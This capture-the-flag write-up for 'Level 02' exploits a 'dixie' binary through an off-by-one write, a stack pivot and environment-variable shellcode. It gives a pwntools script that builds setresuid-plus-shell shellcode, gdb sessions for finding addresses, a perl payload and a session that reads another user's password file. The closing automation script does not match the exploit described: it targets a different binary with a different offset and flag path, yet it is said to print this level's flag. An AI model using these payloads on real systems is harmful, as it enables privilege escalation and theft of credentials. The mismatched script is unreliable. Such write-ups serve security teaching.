# Level 02

## Exploit explanation : off-by-one error + stack pivot + ret2shellcode in env

This level uses multiple exploits to find the flag, but they all fit together quite nicely.

### Off-by-one error

An **off-by-one** error is an error where the code has an offset of one too many, in a limit or an index. It can be because of a `<=` instead of a `<`. It will often fall back into another static variable or a security mechanism. But if it is the only static variable of a function for example, it can do stronger things, notably overwrite the LSB (least significant byte) of the `saved rbp` data. `rbp` is a special register, the `frame reference register`, which is used in some compilation methods as a way to orient the stack. When entering a function, this register is pushed on the stack as the `saved rbp`, and this value is pushed on `rbp` at the end of the function (more accurately on the `leave` instruction).

### Stack pivot

By modifying this `saved rbp`, we can do what we call a **stack pivot**. When the function where we modified the `saved rbp` ends, the returned-to function will have a corrupted `rbp` register ! We can *pivot* the stack so that it goes to a memory location that we have a better control on. This pivoting will be processed after the second `leave`, which puts `rbp` into `rsp` (top of stack register).

If we can pivot the stack so that the `saved rip` of the calling function points to a shellcode that we previously injected, we could be able to execute what we want !

In our case, we do not have much choice on where to inject the shellcode, so we opted for an `env` variable. Just like for `level00`, we only need to find the shellcode address in our `env`, be careful to use the same environment, and go to that address.

Enough explanation, now how to do it.

### How to find it

We once again have the source code, which will help us a lot ! Here is the entrypoint function :

```c
static void store_record(void)
{
    char buf[BUF_SIZE];

    if (record_count >= MAX_RECORDS) {
        printf("[FLATLINE] Record buffer full.\n");
        return;
    }

    printf("[FLATLINE] Ready: ");
    fflush(stdout);

    /* Off-by-one: the index runs 0..BUF_SIZE inclusive (<=), so a full
     * BUF_SIZE-byte read still lets the trailing pass write buf[BUF_SIZE].
     * buf is store_record's only local (counter/char are file-scope), so
     * gcc lays it out at rbp-BUF_SIZE with no padding: buf[BUF_SIZE] is the
     * low byte of the saved RBP slot.  One byte too far == one wrong move. */
    in_len = 0;
    while (in_len <= BUF_SIZE) {
        in_ch = read(0, &buf[in_len], 1);
        if (in_ch <= 0)
            break;
        in_len++;
    }

    commit_record(buf, in_len < BUF_SIZE ? in_len : BUF_SIZE);
}
```

They were kind enough to point to us where the exploit was. There are two things that are important here :

- the loop reads one too many : `while (in_len <= BUF_SIZE)`
- the buffer is the only local variable : `char buf[BUF_SIZE];`

This function is called once in main :

```c
int main(void)
{
    char session[16] = "dixie";

    init_records();
    print_banner();
    store_record();
    dump_records();
    printf("\033[0;35m  [FLATLINE] %s session closed.\033[0m\n", session);
    return 0;
}
```

So by knowing that, we can reasonably assume we should be able to pivot the stack for the main function !

## Exploit application

First thing, we don't have enough space in the buffer to properly put a shellcode (well maybe, but we're going to try another way). We will therefore put it in an environment variable. Because it may offset all our addresses, we will start by adding it to our `env`. Let's compute a small shellcode with `pwn` :

```python
#!/usr/bin/env python3
# 1-shellcode.py

import os
import sys
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'error'

binary = "./dixie"
if len(sys.argv) > 1:
    binary = sys.argv[1]

sc = pwn.asm(
    pwn.shellcraft.setresuid(os.stat(binary).st_uid)
    + pwn.shellcraft.sh()
)

with open("shellcode", "wb") as f:
    f.write(sc)
```

We execute it and get the shellcode in the file `shellcode`.

Now that we have the shellcode, let's launch `gdb` with it in our env :

```bash
$ env -i PAYLOAD=$(cat shellcode) gdb -nx dixie
```

`gdb` is not really nice with the `env` and automatically adds two variables, that we remove :

```gdb
(gdb) unset environment LINES
(gdb) unset environment COLUMNS
(gdb) show environment
PAYLOAD=1�f��H��H��juXjhH�/bin///sPH��hri�4$1�V^H�VH��1�j;X
```

First thing we want to do is find our buffer :

```gdb
(gdb) disas store_record
Dump of assembler code for function store_record:
   0x00000000004013d2 <+0>:	endbr64
   0x00000000004013d6 <+4>:	push   %rbp
    # ...
   0x000000000040143b <+105>:	mov    $0x1,%edx
   0x0000000000401440 <+110>:	mov    %rax,%rsi
   0x0000000000401443 <+113>:	mov    $0x0,%edi
   0x0000000000401448 <+118>:	call   0x4010c0 <read@plt>
    # The read is here.
    # read(0, buf, 1)
    # On the first loop, we will find the start address of our buffer in rax
    # ...
   0x00000000004014a1 <+207>:	leave
   0x00000000004014a2 <+208>:	ret
End of assembler dump.
(gdb) b *0x401448
Breakpoint 1 at 0x401448
(gdb) run
Starting program: /home/level02/dixie 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  [FLATLINE] The Dixie Flatline lives again.
  [FLATLINE] ROM construct v3.0 — memory interface ready.
[FLATLINE] Ready: 
Breakpoint 1, 0x0000000000401448 in store_record ()
(gdb) info registers rax
rax            0x7fffffffec30      140737488350256
```

Nice, we now have the buffer address : `0x7fffffffec30`

We know that the 65th character will modify the `saved rbp`. We just need to know by what. Let's take a look at the current `saved rbp`.

```gdb
(gdb) info frame
Stack level 0, frame at 0x7fffffffec80:
 rip = 0x401448 in store_record; saved rip = 0x401575
 called by frame at 0x7fffffffeca0
 Arglist at 0x7fffffffec70, args: 
 Locals at 0x7fffffffec70, Previous frame's sp is 0x7fffffffec80
 Saved registers:
  rbp at 0x7fffffffec70, rip at 0x7fffffffec78
(gdb) x/a 0x7fffffffec70
0x7fffffffec70:	0x7fffffffec90
```

Well this is our lucky day ! The `rbp` of the main function is : `0x7fffffffec90`. Meaning that we only need to change the LSB from `90` to `30` for it to change to our buffer address.

We can now build our payload. The total size is 65. The stack pivot will make so the top of the stack points to the address of our buffer. During the `leave` instruction, the top of the stack is the `saved rbp` and then the `saved rip` that we want to modify. We place a fake saved RBP at the beginning of our buffer, followed by a fake saved RIP pointing to our shellcode.

Finding the address of our shellcode is pretty easy :

```gdb
(gdb) x/100s **(char***)&environ
0x7fffffffef88:	"PAYLOAD=1\377f\277\373\003H\211\372H\211\376juX\017\005jhH\270/bin///sPH\211\347hri\001\001\2014$\001\001\001\0011\366Vj\b^H\001\346VH\211\3461\322j;X\017\005"
0x7fffffffefd2:	"PWD=/home/level02"
0x7fffffffefe4:	"/home/level02/dixie"
0x7fffffffeff8:	""
```

`0x7fffffffef88` is the address of `PAYLOAD=`, but just need to move it by the size of this string : `0x7fffffffef88 + 8 = 0x7fffffffef90`.

Let's build the payload now :

```bash
perl -e 'print("A"x8 . "\x90\xef\xff\xff\xff\x7f\x00\x00" . "A"x48 . "\x30")' > payload
```

We see 8 `A` of padding, place of the `saved rbp`, then the address of our shellcode, then 48 `A` of padding again, and finally the `\x30` to pivot the stack to the start of our buffer. Let's test this in `gdb` :

```gdb
(gdb) d 1    
(gdb) run <payload              
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level02/dixie <payload
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  [FLATLINE] The Dixie Flatline lives again.
  [FLATLINE] ROM construct v3.0 — memory interface ready.
[FLATLINE] Ready: [FLATLINE] Record 0 stored. Checksum: a5aa3f65
[FLATLINE] Record 0: AAAAAAAA����� (checksum: a5aa3f65)
  [FLATLINE] p���� session closed.
process 1410 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 1 (process 1410) exited normally]
```

We can see that `gdb` launches an instance of `/usr/bin/dash`, meaning it worked ! Let's try in an interactive shell. To perfectly reproduce `gdb` environment, we need to use an absolute path for the executable (in order not to change `argv[0]`) and add the `PWD` env variable.

```bash
$ cat payload - | env -i PAYLOAD=$(cat shellcode) PWD=/home/level02 /home/level02/dixie
  [FLATLINE] The Dixie Flatline lives again.
  [FLATLINE] ROM construct v3.0 — memory interface ready.
[FLATLINE] Ready: [FLATLINE] Record 0 stored. Checksum: a5aa3f65
[FLATLINE] Record 0: AAAAAAAA����� (checksum: a5aa3f65)
  [FLATLINE] p���� session closed.

ls -la /home/flag02
total 28
drwx------  2 flag02 flag02 4096 Jun  9 23:13 .
drwxr-xr-x 37 root   root   4096 Jun  9 23:13 ..
-rw-r--r--  1 flag02 flag02  220 Mar 31  2024 .bash_logout
-rw-r--r--  1 flag02 flag02 3771 Mar 31  2024 .bashrc
-rw-r--r--  1 flag02 flag02   30 Jun  9 23:12 .gdbinit
-r--------  1 flag02 flag02   33 Jun  9 23:13 .pass
-rw-r--r--  1 flag02 flag02  807 Mar 31  2024 .profile
cat /home/flag02/.pass
qeplvibynup98phqb312dkvhtpdkklac
```

They made us work for it ! We can now easily build a small script that automates it all for us :

```python
#!/usr/bin/env python3
# 2-exploit.py

import os
import sys
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'error'

OFFSET = 88
NOP_SLED = 512
RET_ADDR = 0x7fffffffe300

binary = "./case"
if len(sys.argv) > 1:
    binary = sys.argv[1]

sc = pwn.asm(
    pwn.shellcraft.setresuid(os.stat(binary).st_uid)
    + pwn.shellcraft.sh()
)

body = b'A' * OFFSET + pwn.p64(RET_ADDR) + b'\x90' * NOP_SLED + sc

with open("payload", "wb") as f:
    f.write(body)

p = pwn.process([binary])
p.sendline(body)
p.sendline(b'cat /home/flag00/.pass')
p.sendline(b'exit')
out = p.recvall(timeout=2)
p.close()

for raw in out.splitlines():
    s = raw.strip()
    if len(s) == 32 and s.isalnum():
        print(s.decode(errors='replace'))
```

and finally :

```bash
$ python3 2-exploit.py 
qeplvibynup98phqb312dkvhtpdkklac
```